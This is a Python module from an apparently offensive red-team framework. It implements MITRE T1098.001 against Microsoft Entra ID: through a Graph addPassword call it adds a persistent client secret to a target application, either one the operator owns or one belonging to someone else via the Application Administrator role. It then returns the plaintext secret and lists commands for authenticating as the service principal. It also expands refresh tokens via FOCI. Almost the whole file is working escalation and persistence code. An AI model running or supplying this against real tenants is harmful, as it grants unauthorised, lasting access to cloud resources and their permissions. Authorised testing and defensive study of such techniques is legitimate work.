# ================================================================
# TECHNIQUE: escalation/entra_app_add_secret
# ----------------------------------------------------------------
# TACTIC:    Privilege Escalation (TA0004) / Lateral Movement (TA0008)
# TECHNIQUE: T1098.001 — Additional Cloud Credentials
#
# PURPOSE:   Add a new client secret to an Entra ID Application, then
#            authenticate as its Service Principal. The underlying
#            Graph call is the same regardless of *why* the operator
#            can make it — a `mode` parameter chooses the framing so
#            the finding / severity / next-steps output matches the
#            engagement narrative.
#
# PROVIDERS: Entra
#
# TWO OPERATOR USE CASES (both same Graph call, different narrative):
#
#   mode=own    — You are the OWNER of the target Application (you
#                 registered it yourself, or ownership was granted to
#                 you). Any owner can add credentials. This is a
#                 typical persistence / initial-access primitive.
#                 Severity: HIGH.
#
#   mode=pivot  — You HOLD Application Administrator or Cloud
#                 Application Administrator (a directory role) and are
#                 modifying someone ELSE's application to authenticate
#                 as their (usually more privileged) service principal.
#                 This is the classic Entra escalation path.
#                 Severity: CRITICAL, generates a Finding.
#
# HOW IT WORKS:
#   1. POST /applications/{object_id}/addPassword with a display name.
#   2. Fetch the app's `appId` (client id needed to authenticate).
#   3. Return the plaintext secret (shown once by Graph, never again).
#
# OPSEC:     HIGH — Generates 'Update application' and 'Add service
#            principal credentials' entries in Entra Audit Logs.
# SAFE:      NO — Modifies cloud state (adds a persistent credential).
# ================================================================

from __future__ import annotations

import logging
from typing import Any

import httpx

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import Parameter, ParameterType, technique
from quantum_mechanic.providers.entra.foci import foci_expand
from quantum_mechanic.providers.entra.graph import _graph_call
from quantum_mechanic.providers.entra.token_store import GRAPH, EntraTokenStore

logger = logging.getLogger(__name__)


def _format_entra_app_add_secret(result: Any) -> None:
    """Render the injected-secret result with mode-appropriate framing."""
    from rich.panel import Panel

    from quantum_mechanic.shell.formatters import console

    data = result.data
    if not isinstance(data, dict) or "error" in data:
        console.print(f"  [red]✗[/red] {data.get('error', 'Unknown error')}")
        return

    mode = data.get("mode", "own")
    app_id = data.get("app_id", "Unknown")
    obj_id = data.get("object_id", "Unknown")
    secret = data.get("secret_text", "")
    tenant = data.get("tenant_id", "<tid>")

    if mode == "pivot":
        headline = "[bold red]✓ PIVOT: added secret to another party's application[/bold red]"
        border = "red"
    else:
        headline = "[bold green]✓ OWN: added secret to your own application[/bold green]"
        border = "green"

    lines = [
        headline,
        "",
        f"[bold]Application ID (client_id):[/bold] {app_id}",
        f"[bold]Object ID:[/bold]                {obj_id}",
        f"[bold]New Secret Value:[/bold]         [bold yellow]{secret}[/bold yellow]",
        "",
        "[dim]Graph does NOT show this secret again — capture it now.[/dim]",
        "",
        "[bold]Use the new credential in QM:[/bold]",
        f"  qm> acquire entra refresh --client {app_id} --resource https://graph.microsoft.com",
        "  [dim]or, if you have client-credentials support wired up:[/dim]",
        f"  qm> import entra secret client_id={app_id} secret={secret} tenant={tenant}",
    ]
    console.print(Panel("\n".join(lines), border_style=border, expand=False))


@technique(
    technique_id="escalation/entra_app_add_secret",
    tactic="escalation",
    mitre_id="T1098.001",
    providers=["entra"],
    severity="high",
    safe=False,
    description=(
        "Add a client secret to an Entra Application. Use mode=own for a "
        "self-owned app, mode=pivot when leveraging Application Administrator."
    ),
    formatter=_format_entra_app_add_secret,
    parameters=[
        Parameter(
            "object_id",
            "Object ID of the target Application (NOT the client/AppId).",
            required=True,
            type=ParameterType.STRING,
            example="7d0300d8-4db4-4df6-82bd-5ecd59e74cd2",
        ),
        Parameter(
            "mode",
            "'own' (default) if you own the target app, 'pivot' if you're "
            "leveraging Application Administrator role against someone "
            "else's app. Only affects framing / finding severity — the "
            "Graph call is identical.",
            required=False,
            type=ParameterType.STRING,
            default="own",
        ),
        Parameter(
            "display_name",
            "Display name for the new secret credential.",
            required=False,
            type=ParameterType.STRING,
            default="QM-Added-Secret",
        ),
    ],
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Add a client secret to an Entra Application via Graph."""
    obj_id = ctx.get_param("object_id")
    mode = (ctx.get_param("mode") or "own").lower()
    if mode not in ("own", "pivot"):
        return {"status": "error", "error": f"Invalid mode {mode!r} — use 'own' or 'pivot'."}
    secret_name = ctx.get_param("display_name")

    store: EntraTokenStore = ctx.session
    token = store.best_token(GRAPH)
    if token is None:
        return {"status": "error", "error": "No Graph token available."}
    if token.token_type == "refresh_token":  # noqa: S105
        token = foci_expand(store, GRAPH)
        if token is None:
            return {"status": "error", "error": "FOCI expansion for Graph failed."}

    headers = {
        "Authorization": f"Bearer {token.value}",
        "Content-Type": "application/json",
    }
    url = f"https://graph.microsoft.com/v1.0/applications/{obj_id}/addPassword"
    payload = {"passwordCredential": {"displayName": secret_name}}

    ctx.info(f"[{mode}] Adding secret '{secret_name}' to application {obj_id}...")

    with httpx.Client(timeout=30) as http:
        resp = _graph_call(http, "POST", url, headers, json_data=payload)

        if resp.status_code != 200:
            if resp.status_code == 403:
                return {
                    "status": "error",
                    "error": (
                        "Access Denied (403). For mode=own: verify you're an "
                        "owner of the app (Owners tab in portal). For "
                        "mode=pivot: you need Application Administrator, "
                        "Cloud Application Administrator, or "
                        "Application.ReadWrite.All on your token."
                    ),
                }
            try:
                err = resp.json().get("error", {}).get("message", resp.text)
            except Exception:
                err = resp.text
            return {
                "status": "error",
                "error": f"Failed to add secret (HTTP {resp.status_code}): {err}",
            }

        cred_data = resp.json()

        # Fetch the client_id — the operator needs it to authenticate.
        app_resp = _graph_call(
            http, "GET",
            f"https://graph.microsoft.com/v1.0/applications/{obj_id}?$select=appId",
            headers,
        )
        app_id = "Unknown"
        if app_resp.status_code == 200:
            app_id = app_resp.json().get("appId", "Unknown")

    # Mode-appropriate outcome recording.
    if mode == "pivot":
        ctx.success(f"Pivoted: new secret generated for app {app_id}")
        ctx.finding(
            title=f"Lateral Movement: added secret to App {app_id}",
            severity="critical",
            description=(
                f"Operator with elevated directory role added a new client "
                f"secret to application {obj_id} ({app_id}). Constitutes "
                "persistence + potential escalation to that app's assigned "
                "roles / API permissions."
            ),
        )
    else:
        ctx.success(f"Own-app secret added for {app_id}")

    return {
        "provider": "entra",
        "status": "success",
        "mode": mode,
        "object_id": obj_id,
        "app_id": app_id,
        "secret_text": cred_data.get("secretText"),
        "key_id": cred_data.get("keyId"),
        "tenant_id": store.tenant_id,
    }
